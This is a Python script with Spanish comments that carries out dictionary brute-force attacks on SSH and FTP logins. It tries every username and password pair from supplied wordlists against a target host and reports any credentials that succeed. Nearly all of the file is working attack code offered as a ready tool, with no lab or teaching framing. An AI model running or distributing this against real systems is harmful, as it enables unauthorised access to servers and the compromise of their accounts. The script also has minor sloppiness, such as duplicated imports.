import paramiko
import ftplib
import os
import paramiko
import ftplib
import os
import argparse
import itertools
from colorama import Fore, Style, init
import socket

# Inicializar colorama
init(autoreset=True)

def clear_screen():
    """ Limpia la pantalla en función del sistema operativo """
    os.system('cls' if os.name == 'nt' else 'clear')

def print_logo():
    """ Imprime el logo del script """
    logo = r"""
888888888888888888888888888888888
88888___88888888888888888___88888
8888_____888888888888888_____8888
8888_____888888888888888_____8888
8888_____888888888888888_____8888
8888_____888888888888888_____8888
8888_____888888888888888_____8888
8888_____888888888888888_____8888
8888_____88____888____88_____8888
8888_____8______8______8_____8888
8888_____8______8______8_____8888
8888_____8______8______8_____8888
8888_____8______8______8_____8888
8888_____8____8888888888888888888
8888_____8___88_____________88888
8888_____8__88_______________8888
8888______888_________________888
8888________88_________________88
8888__________88_______________88
8888____________88_____________88
8888_____________88___________888
8888______________8___________888
8888_______________8__________888
8888_______________8_________8888
88888_______________________88888
888888_____________________888888
888888888888888888888888888888888
    """
    print(Fore.CYAN + logo + Style.RESET_ALL)

def is_port_open(host, port=22):
    """ Verifica si el puerto está abierto en el host """
    try:
        with socket.create_connection((host, port), timeout=5):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def connect_ssh(host, user, password):
    """ Intenta conectarse al servicio SSH con las credenciales proporcionadas """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Verificar si el puerto está abierto
        if not is_port_open(host, port=22):
            print(Fore.RED + f"El puerto 22 en {host} no está accesible.")
            return False

        client.connect(host, username=user, password=password, timeout=10)
        print(Fore.GREEN + "Conexión SSH exitosa con usuario: " + user)
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(Fore.RED + f"Error de autenticación SSH con usuario: {user}")
    except paramiko.SSHException as e:
        print(Fore.RED + f"Error SSH: {e}")
    except socket.error as e:
        print(Fore.RED + f"Error de red: {e}")
    except Exception as e:
        print(Fore.RED + f"Error inesperado: {e}")
    finally:
        client.close()  # Asegúrate de cerrar el cliente SSH
    return False

def connect_ftp(host, user, password):
    """ Intenta conectarse al servicio FTP con las credenciales proporcionadas """
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(user, password)
            print(Fore.GREEN + "Conexión FTP exitosa con usuario: " + user)
            return True
    except ftplib.error_perm:
        print(Fore.RED + f"Error de autenticación FTP con usuario: {user}")
    except ftplib.all_errors as e:
        print(Fore.RED + f"Error FTP: {e}")
    except Exception as e:
        print(Fore.RED + f"Error inesperado: {e}")
    return False

def read_file(file_path):
    """ Lee un archivo y devuelve una lista de líneas """
    if not os.path.isfile(file_path):
        print(Fore.RED + f"Error: El archivo no existe: {file_path}")
        return []
    
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except Exception as e:
        print(Fore.RED + f"Error al leer el archivo {file_path}: {e}")
        return []

def brute_force_ssh(host, user_file, password_file):
    """ Realiza un ataque de fuerza bruta al servicio SSH """
    users = read_file(user_file)
    passwords = read_file(password_file)

    if not users or not passwords:
        return

    for user, password in itertools.product(users, passwords):
        print(Fore.YELLOW + f"Intentando usuario: {user} / Contraseña: {password}")
        if connect_ssh(host, user, password):
            print(Fore.GREEN + "Conexión exitosa con usuario y contraseña encontrados.")
            return
    print(Fore.RED + "No se encontraron credenciales válidas.")

def brute_force_ftp(host, user_file, password_file):
    """ Realiza un ataque de fuerza bruta al servicio FTP """
    users = read_file(user_file)
    passwords = read_file(password_file)

    if not users or not passwords:
        return

    for user, password in itertools.product(users, passwords):
        print(Fore.YELLOW + f"Intentando usuario: {user} / Contraseña: {password}")
        if connect_ftp(host, user, password):
            print(Fore.GREEN + "Conexión exitosa con usuario y contraseña encontrados.")
            return
    print(Fore.RED + "No se encontraron credenciales válidas.")

def main():
    clear_screen()
    print_logo()

    parser = argparse.ArgumentParser(description="Conectar a un servidor usando SSH o FTP.")
    parser.add_argument('-U', '--userfile', help="Archivo con posibles nombres de usuario para fuerza bruta")
    parser.add_argument('-C', '--passfile', help="Archivo con posibles contraseñas para fuerza bruta")
    parser.add_argument('-H', '--host', required=True, help="Dirección del servidor")
    parser.add_argument('-m', '--mode', choices=['normal', 'brute'], default='normal', help="Modo de operación: normal o brute")
    parser.add_argument('-s', '--service', choices=['ssh', 'ftp'], required=True, help="Servicio al que conectar")

    args = parser.parse_args()

    print(f"Modo de operación: {args.mode}")
    print(f"Servicio: {args.service}")
    print(f"Archivo de usuarios: {args.userfile}")
    print(f"Archivo de contraseñas: {args.passfile}")

    if args.mode == 'normal':
        if not args.userfile or not args.passfile:
            print(Fore.RED + "Para el modo normal se deben proporcionar los archivos de usuario y contraseña.")
            return

        user = input("Ingrese el nombre de usuario: ")
        password = input("Ingrese la contraseña: ")
        print(Fore.CYAN + f"Conectando con usuario: {user}")
    else:
        if not args.userfile or not args.passfile:
            print(Fore.RED + "Para el modo de fuerza bruta se deben proporcionar los archivos de usuario y contraseña.")
            return

    if args.service == 'ssh':
        if args.mode == 'normal':
            connect_ssh(args.host, user, password)
        else:
            brute_force_ssh(args.host, args.userfile, args.passfile)
    elif args.service == 'ftp':
        if args.mode == 'normal':
            connect_ftp(args.host, user, password)
        else:
            brute_force_ftp(args.host, args.userfile, args.passfile)

if __name__ == "__main__":
    main()
